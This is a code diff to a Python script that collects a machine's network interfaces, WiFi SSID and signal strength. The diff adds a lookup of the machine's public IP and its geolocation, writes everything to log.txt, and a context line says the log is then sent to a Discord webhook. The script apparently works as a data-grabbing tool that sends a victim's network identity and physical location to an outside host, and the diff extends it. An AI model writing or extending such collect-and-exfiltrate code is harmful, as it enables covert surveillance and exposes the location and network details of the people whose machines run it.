@@ -37,16 +37,33 @@ def get_network_info():
 # Function to get SSID and additional network details
 def get_wifi_details():
     ssid = execute_command('iwgetid -r')
-    signal_strength = execute_command('iwconfig 2>&1 | grep Signal | cut -d "=" -f 3 | cut -d " " -f 1')
+    signal_strength = execute_command('iwconfig 2>&1 | grep Signal | awk \'{print $4}\' | cut -d "=" -f 2')
 
     return {
         'ssid': ssid,
         'signal_strength': signal_strength,
     }
 
+# Function to get public IP address
+def get_public_ip():
+    ip = execute_command('curl -s https://api64.ipify.org')
+    return ip
+
+# Function to get location information based on public IP
+def get_location_info(public_ip):
+    response = requests.get(f'https://ipinfo.io/{public_ip}/json')
+    if response.status_code == 200:
+        location_info = response.json()
+    else:
+        location_info = {'error': 'Could not retrieve location information'}
+
+    return location_info
+
 # Collect detailed network and WiFi information
 network_info = get_network_info()
 wifi_details = get_wifi_details()
+public_ip = get_public_ip()
+location_info = get_location_info(public_ip)
 
 # Write collected information to log.txt
 with open('log.txt', 'w') as f:
@@ -58,8 +75,17 @@ with open('log.txt', 'w') as f:
             f.write(f"Netmask: {addr['netmask']}\n")
             f.write(f"Broadcast Address: {addr['broadcast']}\n")
         f.write("\n")
+    f.write(f"=== WiFi Details ===\n")
     f.write(f"SSID: {wifi_details['ssid']}\n")
     f.write(f"Signal Strength: {wifi_details['signal_strength']} dBm\n")
+    f.write("\n")
+    f.write(f"=== Public IP and Location ===\n")
+    f.write(f"Public IP Address: {public_ip}\n")
+    if 'error' in location_info:
+        f.write(f"Location Information: {location_info['error']}\n")
+    else:
+        for key, value in location_info.items():
+            f.write(f"{key.capitalize()}: {value}\n")
 
 # Send log.txt content to Discord webhook
 with open('log.txt', 'r') as f:
